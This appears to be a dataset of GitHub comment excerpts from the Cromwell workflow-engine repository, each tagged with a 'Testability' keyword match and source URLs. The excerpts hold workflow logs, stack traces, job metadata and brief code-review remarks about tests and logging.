cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$po",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:4589,log,logging,4589,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['log'],['logging']
Testability,"83c42b47; [2018-11-21 15:09:05,54] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-11-21 15:09:05,57] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2018-11-21 15:09:05,58] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-11-21 15:09:06,80] [info] MaterializeWorkflowDescriptorActor [02306258]: Parsing workflow as WDL draft-2; [2018-11-21 15:09:07,34] [info] MaterializeWorkflowDescriptorActor [02306258]: Call-to-Backend assignments: test.hello -> AWSBATCH; [2018-11-21 15:09:08,72] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Starting test.hello; [2018-11-21 15:09:10,76] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: echo 'Hello World!' > ""helloWorld.txt""; [2018-11-21 15:09:10,80] [info] Submitting job to AWS Batch; [2018-11-21 15:09:10,80] [info] dockerImage: ubuntu:latest; [2018-11-21 15:09:10,80] [info] jobQueueArn: arn:aws:batch:us-east-1:267795504649:job-queue/GenomicsHighPriorityQue-ae4256f76f07d96; [2018-11-21 15:09:10,80] [info] taskId: test.hello-None-1; [2018-11-21 15:09:10,80] [info] hostpath root: test/hello/02306258-436a-4372-ab54-2dcd83c42b47/None/1; [2018-11-21 15:09:14,56] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: job id: 77106e8d-c518-4c0d-82e9-3f23e1f07040; [2018-11-21 15:09:14,62] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from - to Running; [2018-11-21 15:09:37,18] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from Running to Succeeded; [2018-11-21 15:09:39,33] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; }; [2018-11-21 15:09:39,37",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:3287,test,test,3287,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['test'],['test']
Testability,972c-0e59d2a56174_auth.json; exec: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/exec.sh; mutectMergedRawVCF-0: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; labels: {}; logging:; gcsPath: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task.log; outputs:; VEP_Task-rc.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task-rc.txt; df.log.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/df.log.txt; dstat.log.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/dstat.log.txt; variant_effect_output.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/variant_effect_output.txt; variant_effect_output.txt_summary.html: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/variant_effect_output.txt_summary.html; projectId: broad-firecloud-benchmark; resources:; bootDiskSizeGb: 0; disks: []; minimumCpuCores: 0; minimumRamGb: 0; noAddress: false; preemptible: false; zones: []; serviceAccount:; email: default; scopes:; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/compute; runtimeMetadata:; '@type': type.googleapis.com/google.genomics.v1alpha2.RuntimeMetad,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:4892,log,log,4892,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['log'],['log']
Testability,9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; name: mutectMergedRawVCF-0; - localCopy:; disk: local-disk; path: firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; name: VEP_File-0; - localCopy:; disk: local-disk; path: exec.sh; name: exec; name: CallingGroup_Workflow; outputParameters:; - localCopy:; disk: local-disk; path: VEP_Task-rc.txt; name: VEP_Task-rc.txt; - localCopy:; disk: local-disk; path: dstat.log.txt; name: dstat.log.txt; - localCopy:; disk: local-disk; path: df.log.txt; name: df.log.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt; name: variant_effect_output.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt_summary.html; name: variant_effect_output.txt_summary.html; projectId: broad-firecloud-benchmark; resources:; bootDiskSizeGb: 10; disks:; - mountPoint: /cromwell_root; name: local-disk; sizeGb: 31; type: PERSISTENT_HDD; minimumCpuCores: 1; minimumRamGb: 7; zones:; - us-central1-b; - us-central1-c; - us-central1-f; pipelineArgs:; clientId: ''; inputs:; VEP_File-0: gs://firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; __extra_config_gcs_path: gs://cromwell-auth-broad-firecloud-benchmark/04b3f189-18f3-47b3-972c-0e59d2a56174_auth.json; exec: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/exec.sh; mutectMergedRawVCF-0: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; labels: {}; logging:; gcsPath: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task.log; outputs:; VEP_Task-rc.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a8888400,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:3459,benchmark,benchmark,3459,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['benchmark'],['benchmark']
Testability,": ""us-central1-c"",; ""memory"": ""2 GB""; },; ""cache"": {; ""allowResultReuse"": true; },; ""inputs"": {; ""disk_size"": ""flowcell_small_disk"",; ""input_bam"": ""unmapped_bam"",; ""metrics_filename"": ""sub(sub(unmapped_bam, sub_strip_path, \""\""), sub_strip_unmapped, \""\"") + \"".unmapped.quality_yield_metrics\""""; },; ""failures"": [{; ""failure"": ""Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly."",; ""timestamp"": ""2016-04-24T20:04:45.145Z""; }],; ""jobId"": ""operations/EIXH28fEKhisk93Qxr_9-K4BIJ-ikOmeDSoPcHJvZHVjdGlvblF1ZXVl"",; ""backend"": ""JES"",; ""end"": ""2016-04-24T20:04:45.000Z"",; ""stderr"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2-stderr.log"",; ""attempt"": 1,; ""executionEvents"": [],; ""backendLogs"": {; ""log"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2.log""; },; ""start"": ""2016-04-24T15:50:19.000Z""; }. ```. Log stack trace: . ```; 3589853:2016-04-24 20:04:45,142 cromwell-system-akka.actor.default-dispatcher-16 INFO - JES Run [UUID(129f0510):CollectQualityYieldMetrics:2]: Status change from Running to Failed; 3589854:2016-04-24 20:04:45,145 cromwell-system-akka.actor.default-dispatcher-16 ERROR - CallActor [UUID(129f0510):CollectQualityYieldMetrics:2]: Failing call: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589855:java.lang.Throwable: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589856- at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$handleFailure(Je",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:1586,log,log,1586,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,2,['log'],['log']
Testability,:+1: . I am curious though if there's any concern if the 403 change is due to the test doing something wrong. I'm also a little leery that this is tied to DSDEEPB-2361 somehow. If you think it might be can you make a note on that ticket regarding this code change?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/366#issuecomment-170382002:82,test,test,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/366#issuecomment-170382002,1,['test'],['test']
Testability,":+1: . Yeah this is going to change a lot in the shadow world, but these changes do eliminate a lot of db stuff from the backend, integrate retries on the upserts, and test the heck out of restarts. 😄",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/704#issuecomment-210148650:168,test,test,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/704#issuecomment-210148650,1,['test'],['test']
Testability,":+1: Although there is already another warning being issued a few lines below (`failMessage foreach { m => logger.warn(s""$m. $retryMessage"") }`), maybe the message could be incorporated in this one to try and limit the number of logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/256#issuecomment-151227093:107,log,logger,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/256#issuecomment-151227093,2,['log'],"['logger', 'logs']"
Testability,":+1: Minor questions, Nice testing. Travis looks like its harassing you... [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/2102/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2102#issuecomment-291512744:27,test,testing,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2102#issuecomment-291512744,1,['test'],['testing']
Testability,":+1: Seconding the idea of adding a test, otherwise LGTM. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/2271/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2271#issuecomment-302416979:36,test,test,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2271#issuecomment-302416979,1,['test'],['test']
Testability,:+1: a comment in the tests as to why we want to test those things would be awesome. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1949/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1949#issuecomment-277369027:22,test,tests,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1949#issuecomment-277369027,2,['test'],"['test', 'tests']"
Testability,:+1: although I want to point out the workflow logging change (which seems to just be an add-on and not part of the PR?) to @kshakir as it might affect what he's doing,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-165153085:47,log,logging,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-165153085,1,['log'],['logging']
Testability,:+1: barring the test failure... I looked into it briefly but I didn't figure anything out. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/573/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/573#issuecomment-197986609:17,test,test,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/573#issuecomment-197986609,1,['test'],['test']
Testability,:+1: delta the commented out test,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/378#issuecomment-173255935:29,test,test,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/378#issuecomment-173255935,1,['test'],['test']
Testability,":+1: delta your ""test at scale"" item. 😄 Very cool!. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1277/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1277#issuecomment-239000015:17,test,test,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1277#issuecomment-239000015,1,['test'],['test']
Testability,:+1: even without test,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/196#issuecomment-142703551:18,test,test,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/196#issuecomment-142703551,1,['test'],['test']
Testability,":+1: for me beyond others' comments. Nominating @mcovarr as second reviewer. FYI testing on my laptop against JES, and early positive results with Genomes in the Cloud WDL + inputs!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/207#issuecomment-144563092:81,test,testing,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/207#issuecomment-144563092,1,['test'],['testing']
Testability,:+1: nice bump in the test coverage! 😄 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/878/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/878#issuecomment-221298017:22,test,test,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/878#issuecomment-221298017,1,['test'],['test']
Testability,":+1: on the current changes. Would love to see unit tests, but haven't examined thoroughly what we have currently for `CallActor`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/326#issuecomment-164903691:52,test,tests,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/326#issuecomment-164903691,1,['test'],['tests']
Testability,":+1: to what @mcovarr said. Every merge into develop is run against the same tests/tyburn as any other thing so the fact that it involves backends shouldn't matter. Further, doing it this way gives us better insight as we move along.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198492190:77,test,tests,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198492190,1,['test'],['tests']
Testability,:+1: turning on a couple of tests diminishes coverage?. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1056/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1056#issuecomment-228054076:28,test,tests,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1056#issuecomment-228054076,1,['test'],['tests']
Testability,:+1: very nice test!. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1130/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1130#issuecomment-230914991:15,test,test,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1130#issuecomment-230914991,1,['test'],['test']
Testability,":+1:. Very nice! I need to go back and re-read this after my brain cools down, but the tests give me a lot of confidence it's all working. 🙂 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1969/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1969#issuecomment-279063986:87,test,tests,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1969#issuecomment-279063986,1,['test'],['tests']
Testability,"://wiki.openjdk.java.net/display/Nashorn/Nashorn+jsr223+engine+notes. See also:. - https://stackoverflow.com/questions/44232013/is-there-a-way-to-make-a-custom-implementation-of-nashorn-jsobject-work-with-obj#44246540; */; final String expr2 = expr(""print('testKeyCastImplicit hello again ' + obj[true]);"");; final Map<String, Object> args2 = Collections.singletonMap(""obj"", result1);; eval(expr2, args2);; }. /**; * Create and use an object in Javascript, return it to Java, and then pass it back into similar Javascript. In the; * second Javascript call we only get a non-null result when the key is explicitly cast to a string.; */; private static void testKeyCastExplicit() throws ScriptException {; final String expr1 = expr(; ""var obj = {};"",; ""obj[true] = 'world';"",; ""print('testKeyCastExplicit hello init ' + obj[true]);"",; ""obj;""; );; final Map<String, Object> args1 = Collections.emptyMap();; final JSObject result1 = (JSObject) eval(expr1, args1);. final String expr2 = expr(""print('testKeyCastExplicit hello again ' + obj[true.toString()]);"");; final Map<String, Object> args2 = Collections.singletonMap(""obj"", result1);; eval(expr2, args2);; }. /**; * Show that keys do not coerce to a string in a java.util.Map.; */; private static void testKeyMapString() throws ScriptException {; /*; See notes in testKeyCastImplicit regarding keys should be cast to strings. Because ECMA says that keys are strings, this lookup should work but doesn't.; */; final String expr = expr(; ""print('testKeyMapString hello ' + obj[true]);"",; ""obj;""; );; final Map<String, Object> obj = Collections.singletonMap(""true"", ""world"");; final Map<String, Object> args = Collections.singletonMap(""obj"", obj);; eval(expr, args);; }. /**; * Show that key equality works for non-strings in a java.util.Map.; */; private static void testKeyMapNonString() throws ScriptException {; /*; See notes in testKeyCastImplicit regarding keys should be cast to strings. Keys are not coerced to strings upon lookup nor internally",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573:4265,test,testKeyCastExplicit,4265,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573,1,['test'],['testKeyCastExplicit']
Testability,":09 -0500] ""GET /api/workflows/v1/3d01da76-98f9-4751-a3c0-efc61ef67030/status HTTP/1.1"" 200 73 ""-"" ""spray-can/1.3.2""; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:38,243 cromwell-system-akka.dispatchers.backend-dispatcher-101 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Running to Success; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:38,977 cromwell-system-akka.dispatchers.engine-dispatcher-57 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Workflow test complete. Final Outputs:; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: ""test.hello.response"": ""gs://fc-cd1f5468-d0f9-4416-8cdc-9464482022dd/8ee1f938-a92c-48df-a4cc-7a0683413547/test/3d01da76-98f9-4751-a3c0-efc61ef67030/call-hello/hello-stdout.log""; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,178 cromwell-system-akka.dispatchers.engine-dispatcher-67 INFO - WorkflowManagerActor WorkflowActor-3d01da76-98f9-4751-a3c0-efc61ef67030 is in a terminal state: WorkflowSucceededState; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,178 cromwell-system-akka.dispatchers.io-dispatcher-10 INFO - $f [UUID(3d01da76)]: Copying workflow logs from /cromwell-workflow-logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef67030.log to /8ee1f938-a92c-48df-a4cc-7a0683413547/workflow.logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef67030.log; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,184 cromwell-system-akka.actor.default-dispatcher-154 INFO - Message [cromwell.subworkflowstore.SubWorkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/cromwell-service/SubWorkflowStoreActor#1592013866] to Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowAc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279542986:2682,log,log,2682,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279542986,1,['log'],['log']
Testability,":11,093 INFO - sql_metadata_changelog.xml: metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir: Data deleted from CUSTOM_LABEL_ENTRY; 2018-06-07 12:16:11,093 INFO - sql_metadata_changelog.xml: metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir: Unique constraint UC_CUSTOM_LABEL_ENTRY_CLK_CLV_WEU dropped from CUSTOM_LABEL_ENTRY; 2018-06-07 12:16:11,094 INFO - sql_metadata_changelog.xml: metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir: Unique constraint added to CUSTOM_LABEL_ENTRY(CUSTOM_LABEL_KEY, WORKFLOW_EXECUTION_UUID); 2018-06-07 12:16:11,094 INFO - sql_metadata_changelog.xml: metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir: ChangeSet metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir ran successfully in 2ms; 2018-06-07 12:16:11,095 INFO - Successfully released change log lock; 2018-06-07 12:16:11,332 INFO - Slf4jLogger started; 2018-06-07 12:16:11,499 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6c9b8d4"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2018-06-07 12:16:11,540 cromwell-system-akka.dispatchers.service-dispatcher-10 INFO - Metadata summary refreshing every 2 seconds.; 2018-06-07 12:16:11,574 cromwell-system-akka.dispatchers.service-dispatcher-8 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.actor.default-dispatcher-2 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2018-06-07 12:16",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:96093,log,log,96093,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['log'],['log']
Testability,:1795); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.FlatSpecLike.run(FlatSpecLike.scala:1795); at org.scalatest.FlatSpecLike.run$(FlatSpecLike.scala:1793); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.run(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:10934,Test,Tests,10934,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,3,['Test'],['Tests']
Testability,:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$2(WorkflowFailSlowSpec.scala:18); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at 